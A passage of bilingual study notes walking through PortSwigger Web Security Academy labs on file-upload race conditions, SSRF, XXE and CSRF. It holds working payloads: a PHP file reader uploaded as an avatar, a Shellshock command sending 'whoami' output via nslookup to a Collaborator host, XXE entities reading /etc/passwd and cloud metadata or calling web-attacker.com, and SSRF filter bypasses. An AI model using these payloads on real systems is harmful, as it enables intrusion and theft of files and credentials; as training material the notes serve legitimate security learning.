Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa500530310b67c80e68f3b00bd001e.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7

------WebKitFormBoundary1M9f5EglegfyCjOT
Content-Disposition: form-data; name="avatar"; filename="test2.php"
Content-Type: application/octet-stream

&lt;?php echo file_get_contents('/home/carlos/secret'); ?>
------WebKitFormBoundary1M9f5EglegfyCjOT
Content-Disposition: form-data; name="user"

wiener
------WebKitFormBoundary1M9f5EglegfyCjOT
Content-Disposition: form-data; name="csrf"

hBN5d6yFfgd0jNxoTTvpMrqXCe3eTFNM
------WebKitFormBoundary1M9f5EglegfyCjOT--
'''</span>

    request2 <span class="token operator">=</span> <span class="token triple-quoted-string string">'''
GET /files/avatars/test2.php HTTP/2
Host: 0aa500530310b67c80e68f3b00bd001e.web-security-academy.net
Cookie: session=rnywyMgYRVeYjEzXMSVnWoRojxFolazA
Sec-Ch-Ua: "Not A(Brand";v="24", "Chromium";v="110"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0aa500530310b67c80e68f3b00bd001e.web-security-academy.net/my-account
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
If-None-Match: "9627-602c39c67c7e3"
If-Modified-Since: Sun, 13 Aug 2023 01:10:26 GMT

'''</span>

    <span class="token comment"># the 'gate' argument blocks the final byte of each request until openGate is invoked</span>
    engine<span class="token punctuation">.</span>queue<span class="token punctuation">(</span>request1<span class="token punctuation">,</span> gate<span class="token operator">=</span><span class="token string">'race1'</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        engine<span class="token punctuation">.</span>queue<span class="token punctuation">(</span>request2<span class="token punctuation">,</span> gate<span class="token operator">=</span><span class="token string">'race1'</span><span class="token punctuation">)</span>

    <span class="token comment"># wait until every 'race1' tagged request is ready</span>
    <span class="token comment"># then send the final byte of each request</span>
    <span class="token comment"># (this method is non-blocking, just like queue)</span>
    engine<span class="token punctuation">.</span>openGate<span class="token punctuation">(</span><span class="token string">'race1'</span><span class="token punctuation">)</span>

    engine<span class="token punctuation">.</span>complete<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">handleResponse</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> interesting<span class="token punctuation">)</span><span class="token punctuation">:</span>
    table<span class="token punctuation">.</span>add<span class="token punctuation">(</span>req<span class="token punctuation">)</span></code></pre></li>
<li><p>结果<img src="https://s2.loli.net/2023/08/13/EKa1uCqgoG4w5OM.png"
alt="image-20230813095101955" /></p></li>
</ol>
<h4 id="race-conditions-in-url-based-file-uploads">Race conditions in
URL-based file uploads</h4>
<ol type="1">
<li>您可以尝试<strong>延长</strong>处理文件所需的时间，从而延长了暴力破解目录名称的窗口。一种方法是上传<strong>更大的文件</strong>。如果以块的形式处理它，您可以通过创建一个恶意文件来利用这一点，该文件的开头是有效负载，后跟大量任意填充字节。</li>
</ol>
<h4 id="uploading-malicious-client-side-scripts">Uploading malicious
client-side scripts</h4>
<ol type="1">
<li>if you can upload <code>HTML files</code> or
<code>SVG images</code>, you can potentially use
<code>&lt;script&gt;</code> tags to create <code>stored XSS</code>
payloads.</li>
</ol>
<h4 id="uploading-files-using-put">Uploading files using PUT</h4>
<ol type="1">
<li><p>If appropriate defenses aren't in place, this can provide an
alternative means of uploading malicious files, <strong>even</strong>
when an upload function isn't available via the web interface.</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">PUT</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>images<span class="token path-separator">/</span>exploit.php</span></span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">vulnerable-website.com</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-httpd-php</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">49</span></span>

&lt;?php echo file_get_contents('/path/to/file'); ?></code></pre></li>
</ol>
<h3 id="server-side-request-forgery-ssrf">Server-side request forgery
(SSRF)</h3>
<ol type="1">
<li><p>Server-side request forgery (also known as SSRF) is a web
security vulnerability that allows an attacker to
<strong>induce</strong> the server-side application to make requests to
an unintended location.</p></li>
<li><p>However, when the request to the /<code>admin</code> URL comes
from the <code>local machine</code> itself, the normal access controls
are bypassed. The application grants full access to the administrative
functionality, because the request appears to <strong>originate from a
trusted location.</strong></p></li>
<li><p>The URL specification contains a number of features that are
liable to be overlooked when implementing ad hoc parsing and validation
of URLs:</p>
<ul>
<li><p>You can embed credentials in a URL before the hostname, using the
<code>@</code> character. For example:</p>
<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;expected-host:fakepassword@evil-host</code></pre></li>
<li><p>You can use the <code>#</code> character to indicate a URL
fragment. For example:</p>
<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;evil-host#expected-host</code></pre></li>
<li><p>You can leverage the DNS naming hierarchy to place required input
into a fully-qualified DNS name that you control. For example:</p>
<pre class="language-none"><code class="language-none">https:&#x2F;&#x2F;expected-host.evil-host</code></pre></li>
<li><p>You can URL-encode characters to confuse the URL-parsing code.
This is particularly useful if the code that implements the filter
handles URL-encoded characters differently than the code that performs
the back-end HTTP request. Note that you can also try <a
target="_blank" rel="noopener" href="https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-double-url-encoding">double-encoding</a>
characters; some servers recursively URL-decode the input they receive,
which can lead to further discrepancies.</p></li>
<li><p>You can use combinations of these techniques together.</p></li>
</ul></li>
</ol>
<h4 id="lab-basic-ssrf-against-the-local-server">Lab: Basic SSRF against
the local server</h4>
<ol type="1">
<li>These kind of <strong>trust relationships</strong>, where requests
originating from the local machine are handled differently than ordinary
requests, is often what makes SSRF into a critical vulnerability.</li>
<li>check stock<img
src="https://s2.loli.net/2023/08/14/XuryvgJ9nYA7Op1.png"
alt="image-20230814060840698" /></li>
<li>parameter:stockAPi<img
src="https://s2.loli.net/2023/08/14/D4MplKrduUFk1si.png" /></li>
<li>modify parameter <img
src="https://s2.loli.net/2023/08/14/dkguVR8EwjtnaZT.png"
alt="image-20230814061014089" /></li>
</ol>
<h4 id="lab-basic-ssrf-against-another-back-end-system">Lab: Basic SSRF
against another back-end system</h4>
<ol type="1">
<li><p>intruder:192.168.0.x<img
src="https://s2.loli.net/2023/08/14/LshJb6e2gcBZOSD.png"
alt="image-20230814064551863" /></p></li>
<li><p>select this<img
src="https://s2.loli.net/2023/08/14/lSOLTZR2nvychG8.png"
alt="image-20230814064628703" /></p></li>
</ol>
<h4 id="circumventing-common-ssrf-defenses">Circumventing common SSRF
defenses</h4>
<ol type="1">
<li>Using an alternative IP representation of <code>127.0.0.1</code>,
such as <code>2130706433</code>, <code>017700000001</code>, or
<code>127.1</code>.</li>
<li>Registering your own domain name that resolves to
<code>127.0.0.1</code>. You can use
<code>spoofed.burpcollaborator.net</code> for this purpose</li>
<li>Providing a URL that you control, which subsequently redirects to
the target URL. Try using d<strong>ifferent redirect codes</strong>, as
well as <strong>different protocols</strong> for the target URL. For
example, switching from an <code>http:</code> to <code>https:</code> URL
during the redirect has been shown to bypass some anti-SSRF
filters.</li>
</ol>
<h4 id="lab-ssrf-with-blacklist-based-input-filter">Lab: SSRF with
blacklist-based input filter</h4>
<ol type="1">
<li>test
<ol type="1">
<li><code>127.0.0.1</code><img
src="https://s2.loli.net/2023/08/14/x2vtnuldOz4VSsq.png"
alt="image-20230814065913566" /></li>
<li><code>127.1</code><img
src="https://s2.loli.net/2023/08/14/lBTfgOmUXbkHena.png"
alt="image-20230814065950052" /></li>
<li><code>127.1/admin</code><img
src="https://s2.loli.net/2023/08/14/Usf5dK8Gh1vqFnW.png"
alt="image-20230814070011409" /></li>
</ol></li>
<li><code>admin</code> :double urlcode 'a'<img
src="https://s2.loli.net/2023/08/14/1mKf3vanruOG8UR.png"
alt="image-20230814070114779" /></li>
</ol>
<h4 id="bypassing-ssrf-filters-via-open-redirection">Bypassing SSRF
filters via open redirection</h4>
<h4
id="lab-ssrf-with-filter-bypass-via-open-redirection-vulnerability">Lab:
SSRF with filter bypass via open redirection vulnerability</h4>
<ol type="1">
<li>observe parameter:<code>path</code> <img
src="https://s2.loli.net/2023/08/14/NWGiOz318K7JwTl.png" /></li>
<li>modify stockApi<img
src="https://s2.loli.net/2023/08/14/sQ5dne7I2EuCJal.png"
alt="image-20230814071433646" /></li>
</ol>
<h4 id="blind-ssrf-vulnerabilities">Blind SSRF vulnerabilities</h4>
<ol type="1">
<li>The most reliable way to detect blind SSRF vulnerabilities is using
<code>out-of-band (OAST)</code> techniques.</li>
</ol>
<h4 id="lab-blind-ssrf-with-out-of-band-detection">Lab: Blind SSRF with
out-of-band detection</h4>
<ol type="1">
<li>replace <code>Referer</code> with Collaborator payload <img
src="https://s2.loli.net/2023/08/14/4tubNROUroCmWJK.png"
alt="image-20230814074916651" /></li>
</ol>
<h4 id="lab-blind-ssrf-with-shellshock-exploitation">Lab: Blind SSRF
with Shellshock exploitation]</h4>
<ol type="1">
<li><p>install extension:<code>Collaborator Everywhere</code> <img
src="https://s2.loli.net/2023/08/14/yVGth93nEoxpwXA.png"
alt="image-20230814082010294" /></p></li>
<li><p>load a product page<img
src="https://s2.loli.net/2023/08/14/R7ZTGIJauv1hFYo.png"
alt="image-20230814082141247" /></p></li>
<li><p>observe:some issues<img
src="https://s2.loli.net/2023/08/14/ABCVpvG9weoPk3I.png"
alt="image-20230814082257631" /></p></li>
<li><p>intruder:user-agent and referer<img
src="https://s2.loli.net/2023/08/14/YwmOc8rgb3hRBQZ.png"
alt="image-20230814082321399" /></p>
<ol type="1">
<li><p>user-agent:</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token builtin class-name">:</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span> /usr/bin/nslookup <span class="token variable"><span class="token variable">$(</span><span class="token function">whoami</span><span class="token variable">)</span></span>.BURP-COLLABORATOR-SUBDOMAIN</code></pre>
<p>这个负载的目的是在受影响的系统上利用Shellshock漏洞执行恶意操作，特别是通过执行<code>nslookup</code>命令来触发DNS查询，将结果发送到名为
"BURP-COLLABORATOR-SUBDOMAIN" 的Collaborator域。分解一下这个负载：</p>
<ol type="1">
<li><p><code>() &#123; :; &#125;;</code>：这是一个Shellshock漏洞的利用技巧。在这里，<code>()</code>创建了一个匿名的Shell函数，紧接着是<code>&#123; :; &#125;</code>，这是一个伪命令，不执行任何操作。这种结构可以绕过Shellshock修补程序中的一些保护措施。</p></li>
<li><p><code>/usr/bin/nslookup</code>：这部分指定了要执行的命令，即
<code>nslookup</code> 命令。<code>nslookup</code>
命令用于执行DNS查询，通常用于查找域名的IP地址。</p></li>
<li><p><code>$(whoami).BURP-COLLABORATOR-SUBDOMAIN</code>：这部分利用Shell的命令替换功能，将当前用户的用户名（通过
<code>whoami</code> 命令获取）与
<code>BURP-COLLABORATOR-SUBDOMAIN</code>
拼接在一起，形成一个域名。该域名将作为参数传递给 <code>nslookup</code>
命令，触发DNS查询。
总之，这个负载的目标是通过Shellshock漏洞，使用已经被注入的环境变量来执行
<code>nslookup</code>
命令，然后触发DNS查询，将恶意操作结果发送到一个名为
"BURP-COLLABORATOR-SUBDOMAIN"
的Collaborator域。这可以用来检测和利用受影响系统上的Shellshock漏洞，并在攻击者控制的Collaborator服务器上获取一些信息。</p></li>
</ol></li>
<li><p>referer:http://192.168.0.1:8080</p></li>
<li><p>intruderpaylaod <img
src="https://s2.loli.net/2023/08/14/D8KLnTlbsHZgmjU.png"
alt="image-20230814082614622" /></p></li>
</ol></li>
<li><p>collaborator:<img
src="https://s2.loli.net/2023/08/14/j1GCuiQpf4I7zlM.png"
alt="image-20230814082659313" /></p></li>
</ol>
<h4 id="lab-ssrf-with-whitelist-based-input-filter">Lab: SSRF with
whitelist-based input filter</h4>
<ol type="1">
<li><code>%2523</code>：这是 <code>#</code> 符号的双 URL 编码。
<code>%25</code> 是 <code>%</code> 符号的 URL 编码，而 <code>%23</code>
是 <code>#</code> 符号的 URL 编码。<img
src="https://s2.loli.net/2023/08/14/aUn26gO8vDdoVc5.png"
alt="image-20230814090052414" /></li>
</ol>
<h3 id="xml-external-entity-xxe-injection">XML external entity (XXE)
injection</h3>
<h4 id="exploiting-xxe-to-retrieve-files">Exploiting XXE to retrieve
files</h4>
<ol type="1">
<li>POST /product/stock<img
src="https://s2.loli.net/2023/08/14/3fXUSd18F4q5Pxp.png"
alt="image-20230814120112426" /></li>
<li>modify xml<img
src="https://s2.loli.net/2023/08/14/6vgOIWXuUbrfQZ5.png"
alt="image-20230814120127298" /></li>
</ol>
<h4 id="lab-exploiting-xxe-to-perform-ssrf-attacks">Lab: Exploiting XXE
to perform SSRF attacks</h4>
<ol type="1">
<li><p>payload</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset">
  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/">
</span><span class="token punctuation">]</span><span class="token punctuation">></span></span></code></pre>
<ul>
<li><code>&lt;!DOCTYPE test [ ... ]&gt;</code>：这是DTD（Document Type
Definition）声明的一部分，它用于定义文档的结构和元素。在这里，您正在为文档引入一个名为
"test" 的DTD。</li>
<li><code>&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/"&gt;</code>：这是一个实体定义。实体是XML文档中的占位符，可以包含文本或外部数据。在这里，您定义了一个名为
"xxe" 的实体，其内容指向了 <code>http://169.254.169.254/</code>
这个URL。这个URL是一个特殊的地址，通常用于在内部网络中访问metadata服务</li>
<li><code>metadata</code>
服务通常指的是云计算平台中的一种服务，它提供了有关云实例（虚拟机、容器等）的元数据信息。这些元数据可以包括实例的属性、配置、网络信息、安全凭据等。</li>
</ul></li>
<li><p>get next level's directory<img
src="https://s2.loli.net/2023/08/14/IUY2JB63cZhbzpy.png"
alt="image-20230814123506750" /></p></li>
<li><p>next hierarchy <img
src="https://s2.loli.net/2023/08/14/SI5BAudVxw7MvT2.png"
alt="image-20230814123538806" /></p></li>
<li><p>最后<img src="https://s2.loli.net/2023/08/14/pDwPmzCiMIWUJo6.png"
alt="image-20230814123612435" /></p></li>
</ol>
<h4 id="finding-hidden-attack-surface-for-xxe-injection">Finding hidden
attack surface for XXE injection</h4>
<ol type="1">
<li>if you look in the right places, you will find XXE attack surface in
requests that <strong>do not contain any XML.</strong></li>
</ol>
<h4 id="lab-exploiting-xinclude-to-retrieve-files">Lab: Exploiting
XInclude to retrieve files</h4>
<ol type="1">
<li><p>payload<img
src="https://s2.loli.net/2023/08/14/b7wLtZEHPBSdGKF.png"
alt="image-20230814150739064" /></p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>foo</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XInclude<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">xi:</span>include</span> <span class="token attr-name">parse</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file:///etc/passwd<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>foo</span><span class="token punctuation">></span></span></code></pre>
<ol type="1">
<li><code>&lt;foo&gt;</code>
是一个XML元素示例。它与攻击无直接关系，但作为包含XInclude操作的容器。</li>
<li><code>xmlns:xi="http://www.w3.org/2001/XInclude"</code>
声明了一个命名空间前缀 "xi"，关联到XInclude命名空间URI。这用于引用类似
<code>&lt;xi:include&gt;</code> 的XInclude元素。</li>
<li><code>&lt;xi:include&gt;</code>
是XInclude元素。它用于从另一个XML文档中包含内容。在这种情况下，<code>href</code>
属性指定要包含的文件路径。</li>
<li><code>parse="text"</code>
表示内容应该解析为纯文本。这很重要，因为XInclude还可以包含XML内容，但在这个示例中，您将其视为纯文本。</li>
<li><code>href="file:///etc/passwd"</code>
指定要包含的文件路径。在这种情况下，<code>/etc/passwd</code>
是类Unix系统中常见的文件，包含用户帐户信息。</li>
</ol></li>
</ol>
<h4 id="xxe-attacks-via-file-upload">XXE attacks via file upload</h4>
<ol type="1">
<li>Some common file formats use XML or contain XML subcomponents.
Examples of XML-based formats are office document formats like
<code>DOCX</code> and image formats like <code>SVG.</code></li>
</ol>
<h4 id="lab-exploiting-xxe-via-image-file-upload">Lab: Exploiting XXE
via image file upload</h4>
<ol type="1">
<li><p>payload</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" standalone="yes"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">test</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" > </span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>svg</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>128px<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>128px<span class="token punctuation">"</span></span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2000/svg<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">xmlns:</span>xlink</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/1999/xlink<span class="token punctuation">"</span></span> <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>text</span> <span class="token attr-name">font-size</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>16<span class="token punctuation">"</span></span> <span class="token attr-name">x</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">y</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>16<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>text</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>svg</span><span class="token punctuation">></span></span></code></pre></li>
<li><p>make a svg file<img
src="https://s2.loli.net/2023/08/14/ejucVUXH4TiyoNK.png" /></p></li>
<li><p>in comment:upload file as avatar</p></li>
<li><p>request this avatar<img
src="https://s2.loli.net/2023/08/14/quUjdIh4XyvgSPW.png"
alt="image-20230814153350876" /><img
src="https://s2.loli.net/2023/08/14/IfbSaz8lRnKNY5M.png"
alt="image-20230814153324602" /></p></li>
</ol>
<h4 id="how-to-find-and-test-for-xxe-vulnerabilities">How to find and
test for XXE vulnerabilities</h4>
<ol type="1">
<li>Make sure you also test any XML-based functionality for
<strong>other vulnerabilities</strong> like XSS and SQL injection.</li>
</ol>
<h4 id="xml-entities">XML entities</h4>
<ol type="1">
<li><p>The XML document type definition (<code>DTD</code>)</p></li>
<li><p>What are XML <strong>custom entities</strong>?</p>
<p>XML allows custom entities to be defined within the DTD. For
example:</p>
<pre class="language-none"><code class="language-none">&lt;!DOCTYPE foo [ &lt;!ENTITY myentity &quot;my entity value&quot; &gt; ]&gt;</code></pre>
<p>This definition means that any usage of the entity reference
<code>&amp;myentity;</code> within the XML document will be replaced
with the defined value: "<code>my entity value</code>".</p></li>
<li><p>What are XML <strong>external entities</strong>?</p>
<p>XML external entities are a type of custom entity whose definition is
located outside of the DTD where they are declared.</p>
<p>The declaration of an external entity uses the <code>SYSTEM</code>
keyword and must specify a URL from which the value of the entity should
be loaded. For example:</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY ext SYSTEM "http://normal-website.com" > </span><span class="token punctuation">]</span><span class="token punctuation">></span></span></code></pre>
<p>The URL can use the <code>file://</code> protocol, and so external
entities can be loaded from file. For example:</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">foo</span> <span class="token punctuation">[</span><span class="token internal-subset"> &lt;!ENTITY ext SYSTEM "file:///path/to/file" > </span><span class="token punctuation">]</span><span class="token punctuation">></span></span></code></pre>
<p>XML external entities provide the primary means by which XML external
entity attacks arise</p></li>
</ol>
<h4 id="lab-blind-xxe-with-out-of-band-interaction">Lab: Blind XXE with
out-of-band interaction</h4>
<ol type="1">
<li>OAST<img src="https://s2.loli.net/2023/08/15/dgkBQ8bUxv3m6T5.png"
alt="image-20230815073424075" /></li>
</ol>
<hr />
<ol type="1">
<li><p>use XML parameter entities</p></li>
<li><p>First, the declaration of an XML parameter entity includes the
<code>percent character</code> before the entity name:</p></li>
</ol>
<pre><code>  <pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!ENTITY % myparameterentity &quot;my parameter entity value&quot; &gt;</code></pre></code></pre>
<ol start="2" type="1">
<li><p>parameter entities are referenced <strong>using the percent
character instead of the usual ampersand</strong>:</p>
<pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">%myparameterentity;</code></pre></li>
<li><p>example:</p>
<pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;f2g9j7hhkax.web-attacker.com&quot;&gt; %xxe; ]&gt;</code></pre></li>
</ol>
<h4
id="lab-blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities">Lab:
Blind XXE with out-of-band interaction via XML parameter entities</h4>
<ol type="1">
<li>OAST<img src="https://s2.loli.net/2023/08/15/YKZ6rwjxQoDB3UH.png"
alt="image-20230815074602770" /></li>
</ol>
<hr />
<h4
id="lab-exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd">Lab:
Exploiting blind XXE to exfiltrate data using a malicious external
DTD</h4>
<ol type="1">
<li>make XXE paylaod
<ol type="1">
<li>store<img src="https://s2.loli.net/2023/08/15/aWmsXDJyeVth5N6.png"
alt="image-20230815082052829" /></li>
<li>view exploit:copy url<img
src="https://s2.loli.net/2023/08/15/ayoh5i3qGOXnPE2.png"
alt="image-20230815082203560" /></li>
</ol></li>
<li>this post:paste url<img
src="https://s2.loli.net/2023/08/15/Qa2vCq8NwofnUJW.png"
alt="image-20230815082241668" /></li>
</ol>
<h4
id="lab-exploiting-blind-xxe-to-retrieve-data-via-error-messages">Lab:
Exploiting blind XXE to retrieve data via error messages</h4>
<ol type="1">
<li>process it as the previous lab <img
src="https://s2.loli.net/2023/08/15/qjwMpftJUs5zR4P.png"
alt="image-20230815092937193" /></li>
</ol>
<h4 id="exploiting-blind-xxe-by-repurposing-a-local-dtd">Exploiting
blind XXE by repurposing a local DTD</h4>
<ol type="1">
<li><p>If a document's DTD uses a <strong>hybrid</strong> of internal
and external DTD declarations, then the internal DTD can redefine
entities that are declared in the external DTD. When this happens, the
restriction on using an XML parameter entity within the definition of
another parameter entity is <strong>relaxed</strong>.</p></li>
<li><p>攻击者可以通过使用<code>内部DTD</code>中的错误型XXE技术，重新定义<code>外部DTD</code>中已声明的实体</p></li>
<li><p>example</p>
<pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE foo [
&lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;local&#x2F;app&#x2F;schema.dtd&quot;&gt;
&lt;!ENTITY % custom_entity &#39;
&lt;!ENTITY &#x25; file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
&lt;!ENTITY &#x25; eval &quot;&lt;!ENTITY &#x26;#x25; error SYSTEM &#x27;file:&#x2F;&#x2F;&#x2F;nonexistent&#x2F;&#x25;file;&#x27;&gt;&quot;&gt;
&#x25;eval;
&#x25;error;
&#39;&gt;
%local_dtd;
]&gt;</code></pre></li>
<li><p>For example, Linux systems using the GNOME desktop environment
often have a DTD file at <code>/usr/share/yelp/dtd/docbookx.dtd</code>.
You can test whether this file is present by submitting the following
XXE payload, which will cause an error if the file is missing:</p>
<pre class="language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;!DOCTYPE foo [ &lt;!ENTITY % local_dtd SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt; %local_dtd; ]&gt;</code></pre></li>
<li><p>After you have tested a list of common DTD files to locate a file
that is present, you then need to obtain a <strong>copy of the
file</strong> and review it to find an entity that you can
redefine.</p></li>
</ol>
<h4
id="lab-exploiting-xxe-to-retrieve-data-by-repurposing-a-local-dtd">Lab:
Exploiting XXE to retrieve data by repurposing a local DTD</h4>
<ol type="1">
<li>solve:<img src="https://s2.loli.net/2023/08/15/eEs1MmOkjpQXKf2.png"
alt="image-20230815131538046" /></li>
</ol>
<h3 id="cross-site-request-forgery-csrf">Cross-site request forgery
(CSRF)</h3>
<h4 id="how-to-construct-a-csrf-attack">How to construct a CSRF
attack</h4>
<ol type="1">
<li><code>CSRF PoC Genterator</code></li>
</ol>
<h4 id="lab-csrf-vulnerability-with-no-defenses">Lab: CSRF vulnerability
with no defenses</h4>
<ol type="1">
<li>at: change-email request<img
src="https://s2.loli.net/2023/08/16/iXI5sbAn9JweNl6.png"
alt="image-20230816025332908" />
<ol type="1">
<li>generate CSRF Poc</li>
</ol></li>
<li>perform asction as following:<img
src="https://s2.loli.net/2023/08/16/Wc2uaPFUrzGpe4j.png"
alt="image-20230816025648535" /></li>
<li>paste in exploit server<img
src="https://s2.loli.net/2023/08/16/bL4cgFwBMkDrS9e.png"
alt="image-20230816025727622" />
<ol type="1">
<li>store-&gt;deliver exploit to victim</li>
</ol></li>
</ol>
<h4 id="what-is-the-difference-between-xss-and-csrf">What is the
difference between XSS and CSRF?</h4>
<ol type="1">
<li>CSRF can be described as a "<strong>one-way"</strong> vulnerability,
in that while an attacker can induce the victim to issue an HTTP
request, they cannot retrieve the response from that request.
Conversely, XSS is "<strong>two-way</strong>"</li>
</ol>
<h4 id="bypassing-csrf-token-validation">Bypassing CSRF token
validation</h4>
<ol type="1">
<li>A common way to share CSRF tokens with the client is to include them
as a <code>hidden parameter</code> in an HTML form</li>
</ol>
<h4 id="lab-csrf-where-token-validation-depends-on-request-method">Lab:
CSRF where token validation depends on request method</h4>
<ol type="1">
<li>check request way<img
src="https://s2.loli.net/2023/08/16/Z6TKqNsY1niwh8B.png"
alt="image-20230816034729480" /></li>
<li>chang <code>POST</code> to <code>GET</code>:no longer verify <img
src="https://s2.loli.net/2023/08/16/rW74VNHfuOh9cQK.png"
alt="image-20230816034754479" /></li>
<li>Generate Poc</li>
<li>store and deliver</li>
</ol>
<h4
id="lab-csrf-where-token-validation-depends-on-token-being-present">Lab:
CSRF where token validation depends on token being present</h4>
<ol type="1">
<li>delete the whole csrf tokens
<ol type="1">
<li>only left email parameter <img
src="https://s2.loli.net/2023/08/16/FgO4BaQ7KYGsvA6.png"
alt="image-20230816040520160" /></li>
</ol></li>
</ol>
<h4 id="lab-csrf-where-token-is-not-tied-to-user-session">Lab: CSRF
where token is not tied to user session</h4>
<ol type="1">
<li>login in with wiener and carlos respectively</li>
<li>note that a csrf token can be used only once</li>
<li>with wiener:intercept this request,copy this csrf token ,then drop
this request<img
src="https://s2.loli.net/2023/08/16/zdxmWc5DAuLqFTi.png" /></li>
<li>with carlos:replace csrf token with the copy one,generate PoC</li>
</ol>
<h4 id="csrf-token-is-tied-to-a-non-session-cookie">CSRF token is tied
to a non-session cookie</h4>
<ol type="1">
<li><p>example</p>
